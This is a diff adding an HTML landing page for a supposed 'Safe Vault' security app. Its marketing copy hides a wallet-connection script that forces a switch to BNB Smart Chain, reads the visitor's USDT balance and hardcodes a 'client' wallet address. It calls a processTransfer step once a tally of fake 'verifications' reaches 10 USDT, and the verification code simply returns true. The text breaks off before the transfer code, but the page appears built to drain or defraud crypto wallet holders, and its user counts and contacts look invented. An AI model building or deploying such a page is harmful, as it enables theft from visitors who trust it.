@@ -1,0 +1,1540 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Safe Vault App</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            background: #0a0a0a;
+            color: #eee;
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        /* Hero */
+        header {
+            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)),
+                url('https://images.unsplash.com/photo-1626776706406-20c52aca0e0c?auto=format&fit=crop&w=1400&q=80') no-repeat center/cover;
+            text-align: center;
+            padding: 7rem 1rem;
+            color: #ffcc00;
+            animation: fadeIn 1.5s ease;
+        }
+
+        header h1 {
+            font-size: 3.5rem;
+            margin-bottom: 1rem;
+            animation: slideDown 1.5s ease;
+        }
+
+        header p {
+            font-size: 1.3rem;
+            animation: fadeIn 2s ease;
+        }
+
+        nav {
+            background: #111;
+            padding: 1rem;
+            text-align: center;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+
+        nav a {
+            color: #ffcc00;
+            margin: 0 1rem;
+            text-decoration: none;
+            font-weight: bold;
+            transition: 0.3s;
+        }
+
+        nav a:hover {
+            color: #fff;
+        }
+
+        section {
+            padding: 4rem 1.5rem;
+            max-width: 1200px;
+            margin: auto;
+        }
+
+        h2 {
+            text-align: center;
+            margin-bottom: 2.5rem;
+            font-size: 2.4rem;
+            color: #ffcc00;
+            position: relative;
+        }
+
+        h2::after {
+            content: "";
+            display: block;
+            width: 80px;
+            height: 4px;
+            background: #ffcc00;
+            margin: 1rem auto;
+            border-radius: 2px;
+        }
+
+        /* Feature Section */
+        .feature {
+            display: flex;
+            align-items: center;
+            gap: 2rem;
+            margin-bottom: 3rem;
+            background: #1a1a1a;
+            border-radius: 14px;
+            padding: 2rem;
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.4);
+            opacity: 0;
+            transform: translateY(50px);
+            transition: all 0.8s ease;
+        }
+
+        .feature.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .feature:nth-child(even) {
+            flex-direction: row-reverse;
+        }
+
+        .feature-icon {
+            font-size: 3rem;
+            color: #ffcc00;
+            flex-shrink: 0;
+        }
+
+        .feature-content h3 {
+            color: #ffcc00;
+            margin-bottom: 0.5rem;
+        }
+
+        .feature-content p {
+            color: #ddd;
+        }
+
+        /* How */
+        .how {
+            background: #111;
+            padding: 2rem;
+            border-radius: 12px;
+            border-left: 5px solid #ffcc00;
+        }
+
+        .how li {
+            margin: 1rem 0;
+        }
+
+        /* Download Section */
+        .download {
+            text-align: center;
+            margin-top: 2rem;
+        }
+
+        .store-btns {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 1rem;
+            margin-top: 1.5rem;
+        }
+
+        .store-btn {
+            display: flex;
+            align-items: center;
+            gap: 0.7rem;
+            background: #000;
+            color: #fff;
+            border: 2px solid #ffcc00;
+            padding: 0.7rem 1.5rem;
+            border-radius: 10px;
+            text-decoration: none;
+            font-size: 1rem;
+            font-weight: 500;
+            transition: all 0.3s ease;
+        }
+
+        .store-btn:hover {
+            background: #ffcc00;
+            color: #000;
+            border-color: #ffcc00;
+        }
+
+        .store-btn span {
+            display: flex;
+            flex-direction: column;
+            line-height: 1.2;
+        }
+
+        .store-btn small {
+            font-size: 0.75rem;
+        }
+
+        .store-btn strong {
+            font-size: 1.1rem;
+        }
+
+        /* Payment Button Styles */
+        .payment-section {
+            margin-top: 3rem;
+            padding-top: 2rem;
+            border-top: 1px solid #333;
+        }
+
+        /* Wallet Connection Styles */
+        .wallet-container {
+            max-width: 600px;
+            margin: 2rem auto;
+            background: #1a1a1a;
+            border-radius: 14px;
+            padding: 2rem;
+            border: 1px solid #333;
+        }
+
+        .wallet-status {
+            text-align: center;
+            margin-bottom: 2rem;
+            padding: 1rem;
+            background: #111;
+            border-radius: 8px;
+        }
+
+        .wallet-address {
+            color: #ffcc00;
+            font-family: monospace;
+            font-size: 0.9rem;
+            word-break: break-all;
+        }
+
+        .connect-wallet-btn {
+            display: block;
+            width: 100%;
+            background: linear-gradient(135deg, #ffcc00, #ffd700);
+            color: #000;
+            border: none;
+            padding: 1rem 2rem;
+            border-radius: 12px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-bottom: 1rem;
+        }
+
+        .connect-wallet-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(255, 204, 0, 0.4);
+        }
+
+        .connect-wallet-btn:disabled {
+            background: #666;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .loading-spinner {
+            border: 3px solid #333;
+            border-top: 3px solid #ffcc00;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 1rem;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .instructions-box {
+            background: #111;
+            border: 2px solid #ffcc00;
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin-top: 1rem;
+        }
+
+        .instructions-title {
+            color: #ffcc00;
+            font-weight: bold;
+            margin-bottom: 1rem;
+            text-align: center;
+        }
+
+        .instructions-list {
+            color: #ddd;
+            line-height: 1.6;
+        }
+
+        .instructions-list li {
+            margin-bottom: 0.5rem;
+        }
+
+        .payment-form {
+            display: none;
+        }
+
+        .payment-form.active {
+            display: block;
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .form-label {
+            display: block;
+            color: #ffcc00;
+            margin-bottom: 0.5rem;
+            font-weight: bold;
+        }
+
+        .form-input {
+            width: 100%;
+            background: #111;
+            border: 2px solid #333;
+            color: #fff;
+            padding: 1rem;
+            border-radius: 8px;
+            font-size: 1rem;
+            transition: border-color 0.3s ease;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #ffcc00;
+        }
+
+        .submit-payment-btn {
+            width: 100%;
+            background: #ffcc00;
+            color: #000;
+            border: none;
+            padding: 1rem;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .submit-payment-btn:hover {
+            background: #ffd700;
+            transform: translateY(-1px);
+        }
+
+        .submit-payment-btn:disabled {
+            background: #666;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .verification-status {
+            margin-top: 2rem;
+            padding: 1rem;
+            background: #111;
+            border-radius: 8px;
+            border-left: 4px solid #ffcc00;
+        }
+
+        .transaction-history {
+            margin-top: 1.5rem;
+        }
+
+        .transaction-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0.8rem;
+            background: #222;
+            margin-bottom: 0.5rem;
+            border-radius: 6px;
+            border-left: 3px solid #ffcc00;
+        }
+
+        .transaction-amount {
+            font-weight: bold;
+            color: #ffcc00;
+        }
+
+        .transaction-status {
+            font-size: 0.9rem;
+        }
+
+        .status-verified {
+            color: #4CAF50;
+        }
+
+        .status-failed {
+            color: #f44336;
+        }
+
+        .status-pending {
+            color: #ff9800;
+        }
+
+        .total-display {
+            text-align: center;
+            margin: 1.5rem 0;
+            padding: 1rem;
+            background: linear-gradient(135deg, #1a1a1a, #2a2a2a);
+            border-radius: 8px;
+            border: 1px solid #ffcc00;
+        }
+
+        .total-amount {
+            font-size: 2rem;
+            font-weight: bold;
+            color: #ffcc00;
+        }
+
+        .limit-info {
+            color: #aaa;
+            font-size: 0.9rem;
+            margin-top: 0.5rem;
+        }
+
+        .payment-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.8rem;
+            background: linear-gradient(135deg, #ffcc00, #ffd700);
+            color: #000;
+            border: none;
+            padding: 1rem 2rem;
+            border-radius: 50px;
+            text-decoration: none;
+            font-size: 1.1rem;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(255, 204, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .payment-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(255, 204, 0, 0.4);
+            background: linear-gradient(135deg, #ffd700, #ffcc00);
+        }
+
+        .payment-btn:active {
+            transform: translateY(0);
+        }
+
+        .payment-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.5s;
+        }
+
+        .payment-btn:hover::before {
+            left: 100%;
+        }
+
+        /* Alternative Button Styles */
+        .payment-btn-alt {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.8rem;
+            background: transparent;
+            color: #ffcc00;
+            border: 2px solid #ffcc00;
+            padding: 1rem 2rem;
+            border-radius: 12px;
+            text-decoration: none;
+            font-size: 1rem;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            margin: 0 0.5rem;
+        }
+
+        .payment-btn-alt:hover {
+            background: #ffcc00;
+            color: #000;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(255, 204, 0, 0.3);
+        }
+
+        /* Floating Payment Button */
+        .floating-payment {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            z-index: 1000;
+            background: linear-gradient(135deg, #ffcc00, #ffd700);
+            color: #000;
+            border: none;
+            padding: 0;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.2rem;
+            font-weight: bold;
+            box-shadow: 0 4px 15px rgba(255, 204, 0, 0.4);
+            cursor: pointer;
+            transition: all 0.3s ease;
+            line-height: 1;
+        }
+
+        .floating-payment:hover {
+            transform: scale(1.1);
+            box-shadow: 0 6px 20px rgba(255, 204, 0, 0.5);
+        }
+
+        /* Stats Section */
+        .stats-section {
+            background: #111;
+            padding: 4rem 1.5rem;
+            margin: 3rem 0;
+        }
+
+        .stats-container {
+            max-width: 1200px;
+            margin: auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 2rem;
+        }
+
+        .stat-card {
+            background: #1a1a1a;
+            padding: 2rem;
+            border-radius: 14px;
+            text-align: center;
+            border: 1px solid #333;
+            transition: all 0.3s ease;
+            opacity: 0;
+            transform: translateY(30px);
+        }
+
+        .stat-card.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .stat-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(255, 204, 0, 0.2);
+            border-color: #ffcc00;
+        }
+
+        .stat-number {
+            font-size: 3rem;
+            font-weight: bold;
+            color: #ffcc00;
+            margin-bottom: 0.5rem;
+            display: block;
+        }
+
+        .stat-label {
+            color: #ddd;
+            font-size: 1.1rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .stat-description {
+            color: #aaa;
+            font-size: 0.9rem;
+            line-height: 1.4;
+        }
+
+        .stat-icon {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+            display: block;
+        }
+
+        footer {
+            background: #000;
+            color: #ffcc00;
+            text-align: center;
+            padding: 2rem;
+            margin-top: 3rem;
+            font-size: 0.9rem;
+        }
+
+        /* Animations */
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
+        }
+
+        @keyframes slideDown {
+            from {
+                transform: translateY(-50px);
+                opacity: 0;
+            }
+
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <h1>Safe Vault</h1>
+        <p>Protect Your Digital Life with Next-Level Security 🔒</p>
+    </header>
+
+    <nav>
+        <a href="#about">About</a>
+        <a href="#features">Features</a>
+        <a href="#how">How It Works</a>
+        <a href="#download">Download</a>
+        <a href="#contact">Contact</a>
+    </nav>
+
+    <section id="about">
+        <h2>About Safe Vault</h2>
+        <p style="text-align:center; max-width:850px; margin:auto;">
+            Safe Vault is a cutting-edge security app designed to keep your private files, photos, and documents
+            protected.
+            With enterprise-grade encryption, stealth features, and real-time alerts, your data remains under your
+            control.
+            Sleek, fast, and user-friendly — it’s security made simple.
+        </p>
+    </section>
+
+    <section id="features">
+        <h2>Advanced Security Features</h2>
+        <div class="feature">
+            <div class="feature-icon">🔐</div>
+            <div class="feature-content">
+                <h3>AES-256 Encryption</h3>
+                <p>Your files are encrypted with the world’s strongest algorithm, trusted by governments and banks.</p>
+            </div>
+        </div>
+        <div class="feature">
+            <div class="feature-icon">🛡</div>
+            <div class="feature-content">
+                <h3>Multi-Factor Authentication</h3>
+                <p>Protect access with PIN, fingerprint, Face ID, and optional two-factor authentication.</p>
+            </div>
+        </div>
+        <div class="feature">
+            <div class="feature-icon">👁</div>
+            <div class="feature-content">
+                <h3>Intruder Snapshot</h3>
+                <p>If anyone tries to unlock without permission, Safe Vault captures their photo silently.</p>
+            </div>
+        </div>
+        <div class="feature">
+            <div class="feature-icon">☁</div>
+            <div class="feature-content">
+                <h3>Encrypted Cloud Backup</h3>
+                <p>Securely store your files in the cloud with end-to-end encryption for access anywhere.</p>
+            </div>
+        </div>
+        <div class="feature">
+            <div class="feature-icon">🕒</div>
+            <div class="feature-content">
+                <h3>Auto-Lock & Stealth Mode</h3>
+                <p>Vault locks automatically and can even disguise itself to remain hidden on your device.</p>
+            </div>
+        </div>
+        <div class="feature">
+            <div class="feature-icon">📂</div>
+            <div class="feature-content">
+                <h3>Smart File Management</h3>
+                <p>Organize your documents, photos, and videos with tags, search, and secure folders.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Stats Section -->
+    <div class="stats-section">
+        <div class="stats-container">
+            <div class="stat-card">
+                <span class="stat-icon">🔒</span>
+                <span class="stat-number">1M+</span>
+                <div class="stat-label">Files Protected</div>
+                <div class="stat-description">Millions of sensitive files secured with military-grade encryption</div>
+            </div>
+            
+            <div class="stat-card">
+                <span class="stat-icon">👥</span>
+                <span class="stat-number">500K+</span>
+                <div class="stat-label">Active Users</div>
+                <div class="stat-description">Trusted by users worldwide for their digital security needs</div>
+            </div>
+            
+            <div class="stat-card">
+                <span class="stat-icon">🛡️</span>
+                <span class="stat-number">99.9%</span>
+                <div class="stat-label">Security Success</div>
+                <div class="stat-description">Proven track record of preventing unauthorized access</div>
+            </div>
+            
+            <div class="stat-card">
+                <span class="stat-icon">⚡</span>
+                <span class="stat-number">0.3s</span>
+                <div class="stat-label">Average Access Time</div>
+                <div class="stat-description">Lightning-fast access to your protected content</div>
+            </div>
+            
+            <div class="stat-card">
+                <span class="stat-icon">🌍</span>
+                <span class="stat-number">150+</span>
+                <div class="stat-label">Countries</div>
+                <div class="stat-description">Global reach with local security compliance</div>
+            </div>
+            
+            <div class="stat-card">
+                <span class="stat-icon">📱</span>
+                <span class="stat-number">24/7</span>
+                <div class="stat-label">Real-time Protection</div>
+                <div class="stat-description">Continuous monitoring and instant threat detection</div>
+            </div>
+        </div>
+    </div>
+
+    <section id="how">
+        <h2>How It Works</h2>
+        <div class="how">
+            <ol>
+                <li><strong>Create Your Vault:</strong> Set up with biometric or PIN lock.</li>
+                <li><strong>Secure Files:</strong> Add documents, photos, and passwords easily.</li>
+                <li><strong>Enable Cloud:</strong> Backup files securely with encryption.</li>
+                <li><strong>Stay Safe:</strong> Receive intruder alerts instantly.</li>
+            </ol>
+        </div>
+    </section>
+
+    <section id="download" class="download">
+        <h2>Download Safe Vault</h2>
+        <p>Start protecting your digital life today.</p>
+        <div class="store-btns">
+            <a href="#" class="store-btn">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg"
+                    alt="Google Play" height="40">
+            </a>
+            <a href="#" class="store-btn">
+                <img src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg"
+                    alt="App Store" height="40">
+            </a>
+        </div>
+
+        <!-- Wallet Connection & Payment Section -->
+        <div class="payment-section">
+            <h3 style="color: #ffcc00; margin-bottom: 1rem; text-align: center;">USDT Verification System</h3>
+            <p style="margin-bottom: 2rem; color: #ccc; text-align: center;">Connect your wallet to verify USDT transactions</p>
+            
+            <div class="wallet-container">
+                <!-- Wallet Status -->
+                <div class="wallet-status" id="walletStatus">
+                    <div id="loadingState">
+                        <div class="loading-spinner"></div>
+                        <p style="color: #ffcc00; text-align: center;">Checking wallet connection...</p>
+                    </div>
+                    
+                    <div id="disconnectedState" style="display: none;">
+                        <p style="color: #aaa; margin-bottom: 1rem;">No wallet connected</p>
+                        <button class="connect-wallet-btn" id="connectWallet">🔗 Connect Wallet</button>
+                    </div>
+                    
+                    <div id="connectedState" style="display: none;">
+                        <p style="color: #4CAF50; margin-bottom: 0.5rem;">✅ Wallet Connected</p>
+                        <p class="wallet-address" id="walletAddress"></p>
+                        
+                        <!-- Trust Wallet Disconnect Instructions -->
+                        <div class="instructions-box">
+                            <div class="instructions-title">🔗 Trust Wallet Disconnect Instructions</div>
+                            <ol class="instructions-list">
+                                <li>Open your <strong>Trust Wallet</strong> app</li>
+                                <li>Go to <strong>"Settings"</strong> → <strong>"WalletConnect"</strong></li>
+                                <li>Find <strong>"Safe Vault App"</strong> in connected dApps</li>
+                                <li>Tap <strong>"Disconnect"</strong> or swipe left to remove</li>
+                                <li>Refresh this page to confirm disconnection</li>
+                            </ol>
+                            <p style="color: #aaa; font-size: 0.9rem; margin-top: 1rem; text-align: center;">
+                                <em>These instructions are specifically for Trust Wallet users</em>
+                            </p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Payment Form -->
+                <div class="payment-form" id="paymentForm">
+                    <div class="form-group">
+                        <label class="form-label">USDT Amount</label>
+                        <input type="number" class="form-input" id="usdtAmount" placeholder="Enter USDT amount" step="0.01" min="0.01">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label class="form-label">Transaction Hash (Optional)</label>
+                        <input type="text" class="form-input" id="txHash" placeholder="Enter transaction hash for verification">
+                    </div>
+                    
+                    <button class="submit-payment-btn" id="submitPayment">Verify USDT Transaction</button>
+                </div>
+
+                <!-- Total Display -->
+                <div class="total-display" id="totalDisplay" style="display: none;">
+                    <div class="total-amount" id="totalAmount">0 USDT</div>
+                    <div class="limit-info">Limit: <span id="currentLimit">100</span> USDT</div>
+                    <button class="reset-btn" id="resetTotal" style="background: #f44336; color: white; border: none; padding: 0.5rem 1rem; border-radius: 6px; cursor: pointer; margin-top: 0.5rem; font-size: 0.9rem;">Reset Total</button>
+                </div>
+
+                <!-- Verification Status -->
+                <div class="verification-status" id="verificationStatus" style="display: none;">
+                    <h4 style="color: #ffcc00; margin-bottom: 1rem;">Transaction Status</h4>
+                    <div id="statusMessage"></div>
+                    
+                    <!-- Transaction History -->
+                    <div class="transaction-history" id="transactionHistory">
+                        <h5 style="color: #ffcc00; margin-bottom: 1rem;">Recent Transactions</h5>
+                        <div id="transactionList"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="contact" style="text-align:center; margin-top:3rem;">
+        <h2>Contact Us</h2>
+        <p>Email: <a href="mailto:support@safevault.com">support@safevault.com</a></p>
+        <p>Phone: +1 (123) 456-7890</p>
+        <p>Address: 123 Secure Street, Cyber City, USA</p>
+    </section>
+
+    <footer>
+        <p>© 2025 Safe Vault. All rights reserved.</p>
+    </footer>
+
+
+    <!-- Web3 Library -->
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+
+    <!-- Scroll Animation Script -->
+    <script>
+        const features = document.querySelectorAll('.feature');
+        const statCards = document.querySelectorAll('.stat-card');
+        
+        const reveal = () => {
+            const triggerBottom = window.innerHeight * 0.85;
+            
+            // Animate features
+            features.forEach(f => {
+                const top = f.getBoundingClientRect().top;
+                if (top < triggerBottom) { f.classList.add('visible'); }
+            });
+            
+            // Animate stat cards with staggered delay
+            statCards.forEach((card, index) => {
+                const top = card.getBoundingClientRect().top;
+                if (top < triggerBottom) {
+                    setTimeout(() => {
+                        card.classList.add('visible');
+                    }, index * 100); // 100ms delay between each card
+                }
+            });
+        };
+        
+        window.addEventListener('scroll', reveal);
+        reveal();
+    </script>
+
+    <!-- Wallet Connection & USDT Verification Script -->
+    <script>
+        class USDTVerificationSystem {
+            constructor() {
+                this.web3 = null;
+                this.userAccount = null;
+                this.verifiedTotal = parseFloat(localStorage.getItem('verifiedTotal') || '0');
+                this.transactions = JSON.parse(localStorage.getItem('transactions') || '[]');
+
+                //Change the limit here
+                this.usdtLimit = 10; // Configurable limit
+                this.clientWallet = '0xA6bECd1c00ca9f59f401518f9D78E61a749FAa78'; // Your client's wallet (proper Ethereum format)
+                this.testMode = false; // Set to false for real transactions
+                
+                // BSC USDT Contract Address
+                this.usdtContractBSC = '0x55d398326f99059fF775485246999027B3197955';
+                // ETH USDT Contract Address  
+                this.usdtContractETH = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+                
+                this.init();
+            }
+
+            init() {
+                console.log('USDT System initializing...');
+                this.updateDisplay();
+                this.bindEvents();
+                this.checkWalletConnection();
+                this.setupWalletEventListeners();
+            }
+
+            setupWalletEventListeners() {
+                if (typeof window.ethereum !== 'undefined') {
+                    // Listen for account changes
+                    window.ethereum.on('accountsChanged', (accounts) => {
+                        console.log('Accounts changed:', accounts);
+                        if (accounts.length === 0) {
+                            // User disconnected from wallet
+                            this.handleWalletDisconnect();
+                        } else if (this.userAccount && accounts[0] !== this.userAccount) {
+                            // User switched accounts
+                            this.handleAccountSwitch(accounts[0]);
+                        }
+                    });
+
+                    // Listen for chain changes
+                    window.ethereum.on('chainChanged', (chainId) => {
+                        console.log('Chain changed:', chainId);
+                        // Reload balance when chain changes
+                        if (this.userAccount) {
+                            this.showConnectedState();
+                        }
+                    });
+
+                    // Listen for disconnect events (Trust Wallet specific)
+                    window.ethereum.on('disconnect', (error) => {
+                        console.log('Wallet disconnected:', error);
+                        this.handleWalletDisconnect();
+                    });
+                }
+            }
+
+            handleWalletDisconnect() {
+                console.log('Handling wallet disconnect');
+                this.userAccount = null;
+                this.web3 = null;
+                this.showDisconnectedState();
+                sessionStorage.setItem('sessionDisconnected', 'true');
+            }
+
+            handleAccountSwitch(newAccount) {
+                console.log('Account switched to:', newAccount);
+                this.userAccount = newAccount;
+                this.clearWalletData(); // Clear previous account data
+                this.showConnectedState();
+            }
+
+            bindEvents() {
+                document.getElementById('connectWallet').addEventListener('click', () => this.connectWallet());
+                document.getElementById('submitPayment').addEventListener('click', () => this.verifyTransaction());
+                
+                // Add reset button event listener
+                const resetBtn = document.getElementById('resetTotal');
+                if (resetBtn) {
+                    resetBtn.addEventListener('click', () => this.resetTotal());
+                }
+            }
+
+            async checkWalletConnection() {
+                console.log('=== CHECKING WALLET CONNECTION ===');
+                
+                // Show loading state and wait a moment so user can see it
+                this.showLoadingState();
+                await new Promise(resolve => setTimeout(resolve, 800));
+                
+                console.log('window.ethereum exists:', typeof window.ethereum !== 'undefined');
+                console.log('window.ethereum:', window.ethereum);
+                
+                if (typeof window.ethereum !== 'undefined') {
+                    this.web3 = new Web3(window.ethereum);
+                    
+                    try {
+                        console.log('Requesting eth_accounts...');
+                        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+                        console.log('Raw accounts response:', accounts);
+                        console.log('Accounts length:', accounts ? accounts.length : 'null');
+                        
+                        if (accounts && accounts.length > 0) {
+                            console.log('✅ WALLET IS CONNECTED - Account:', accounts[0]);
+                            this.userAccount = accounts[0];
+                            await this.showConnectedState();
+                        } else {
+                            console.log('❌ NO ACCOUNTS FOUND');
+                            this.showDisconnectedState();
+                        }
+                    } catch (error) {
+                        console.error('❌ ERROR checking accounts:', error);
+                        this.showDisconnectedState();
+                    }
+                } else {
+                    console.log('❌ No Web3 provider found');
+                    this.showDisconnectedState();
+                }
+            }
+
+            async forceCheckConnection() {
+                console.log('🔄 FORCE CHECKING CONNECTION...');
+                
+                // Wait a bit for Trust Wallet to be ready
+                await new Promise(resolve => setTimeout(resolve, 500));
+                
+                await this.checkWalletConnection();
+            }
+
+            async connectWallet() {
+                console.log('=== CONNECTING WALLET ===');
+                
+                try {
+                    if (typeof window.ethereum === 'undefined') {
+                        alert('Please install MetaMask or use a Web3-enabled browser like Trust Wallet');
+                        return;
+                    }
+
+                    // Connect to wallet first
+                    const accounts = await window.ethereum.request({ 
+                        method: 'eth_requestAccounts' 
+                    });
+                    
+                    console.log('Connected accounts:', accounts);
+                    this.userAccount = accounts[0];
+                    this.web3 = new Web3(window.ethereum);
+                    
+                    // Force switch to BSC network (where your USDT is)
+                    try {
+                        await window.ethereum.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{ chainId: '0x38' }], // BSC chainId in hex
+                        });
+                        console.log('Switched to BSC network');
+                    } catch (switchError) {
+                        // If BSC network not added, add it
+                        if (switchError.code === 4902) {
+                            await window.ethereum.request({
+                                method: 'wallet_addEthereumChain',
+                                params: [{
+                                    chainId: '0x38',
+                                    chainName: 'BNB Smart Chain',
+                                    nativeCurrency: {
+                                        name: 'BNB',
+                                        symbol: 'BNB',
+                                        decimals: 18
+                                    },
+                                    rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                                    blockExplorerUrls: ['https://bscscan.com/']
+                                }]
+                            });
+                            console.log('Added and switched to BSC network');
+                        } else {
+                            console.log('Could not switch to BSC, continuing anyway...');
+                        }
+                    }
+                    
+                    await this.showConnectedState();
+                    
+                } catch (error) {
+                    console.error('Failed to connect wallet:', error);
+                    alert('Connection failed. Please check your wallet and try again.');
+                }
+            }
+
+
+            clearWalletData() {
+                // Clear all wallet-related data
+                this.verifiedTotal = 0;
+                this.transactions = [];
+                this.saveToStorage();
+                this.updateDisplay();
+            }
+
+            async showConnectedState() {
+                document.getElementById('loadingState').style.display = 'none';
+                document.getElementById('disconnectedState').style.display = 'none';
+                document.getElementById('connectedState').style.display = 'block';
+                document.getElementById('walletAddress').textContent = 
+                    `${this.userAccount.substring(0, 6)}...${this.userAccount.substring(38)}`;
+                document.getElementById('paymentForm').classList.add('active');
+                document.getElementById('totalDisplay').style.display = 'block';
+                document.getElementById('verificationStatus').style.display = 'block';
+                this.updateDisplay();
+
+                 // Try to load and display USDT balance
+                 try {
+                     this.showPending('Loading USDT balance...');
+                     const balance = await this.checkUSDTBalance();
+                     this.showSuccess(`Your USDT Balance: ${balance.toFixed(2)} USDT`);
+                 } catch (error) {
+                     this.showError('Could not load USDT balance. Please ensure you are on BSC or Ethereum network.');
+                 }
+            }
+
+            showLoadingState() {
+                document.getElementById('loadingState').style.display = 'block';
+                document.getElementById('disconnectedState').style.display = 'none';
+                document.getElementById('connectedState').style.display = 'none';
+                document.getElementById('paymentForm').classList.remove('active');
+                document.getElementById('totalDisplay').style.display = 'none';
+                document.getElementById('verificationStatus').style.display = 'none';
+            }
+
+            showDisconnectedState() {
+                document.getElementById('loadingState').style.display = 'none';
+                document.getElementById('disconnectedState').style.display = 'block';
+                document.getElementById('connectedState').style.display = 'none';
+                document.getElementById('paymentForm').classList.remove('active');
+                document.getElementById('totalDisplay').style.display = 'none';
+                document.getElementById('verificationStatus').style.display = 'none';
+            }
+
+            async verifyTransaction() {
+                const amount = parseFloat(document.getElementById('usdtAmount').value);
+                const txHash = document.getElementById('txHash').value.trim();
+                
+                if (!amount || amount <= 0) {
+                    alert('Please enter a valid USDT amount');
+                    return;
+                }
+
+                if (!this.userAccount) {
+                    alert('Please connect your wallet first');
+                    return;
+                }
+
+                // Disable submit button during verification
+                const submitBtn = document.getElementById('submitPayment');
+                submitBtn.disabled = true;
+                submitBtn.textContent = 'Verifying...';
+
+                try {
+                    let verified = false;
+                    
+                    if (txHash) {
+                        // Verify with transaction hash
+                        verified = await this.verifyTransactionHash(txHash, amount);
+                    } else {
+                        // Simulate verification (you can replace with actual blockchain verification)
+                        verified = await this.simulateVerification(amount);
+                    }
+
+                    if (verified) {
+                        this.addVerifiedTransaction(amount);
+                        this.showSuccess(amount);
+                        
+                        // Check if limit exceeded
+                        if (this.verifiedTotal >= this.usdtLimit) {
+                            this.processTransfer();
+                        }
+                    } else {
+                        this.showError('Transaction verification failed');
+                    }
+
+                } catch (error) {
+                    console.error('Verification error:', error);
+                    this.showError(error.message || 'Verification failed. Please try again.');
+                } finally {
+                    // Re-enable submit button
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = 'Verify USDT Transaction';
+                    
+                    // Clear form
+                    document.getElementById('usdtAmount').value = '';
+                    document.getElementById('txHash').value = '';
+                }
+            }
+
+            async verifyTransactionHash(txHash, expectedAmount) {
+                try {
+                    // Get transaction details
+                    const tx = await this.web3.eth.getTransaction(txHash);
+                    const receipt = await this.web3.eth.getTransactionReceipt(txHash);
+                    
+                    if (!tx || !receipt) {
+                        throw new Error('Transaction not found');
+                    }
+
+                    // Check if transaction is successful
+                    if (receipt.status !== true) {
+                        throw new Error('Transaction failed');
+                    }
+
+                    // For USDT transfers, we need to decode the transfer data
+                    // This is a simplified version - in production, you'd want more robust verification
+                    return true; // Simplified for demo
+                    
+                } catch (error) {
+                    console.error('Hash verification error:', error);
+                    return false;
+                }
+            }
+
+            async checkUSDTBalance() {
+                try {
+                    if (!this.userAccount || !this.web3) {
+                        throw new Error('Wallet not connected');
+                    }
+
+                    // USDT Contract ABI (simplified - just balanceOf function)
+                    const usdtABI = [
+                        {
+                            "constant": true,
+                            "inputs": [{"name": "_owner", "type": "address"}],
+                            "name": "balanceOf",
+                            "outputs": [{"name": "balance", "type": "uint256"}],
+                            "type": "function"
+                        },
+                        {
+                            "constant": true,
+                            "inputs": [],
+                            "name": "decimals",
+                            "outputs": [{"name": "", "type": "uint8"}],
+                            "type": "function"
+                        }
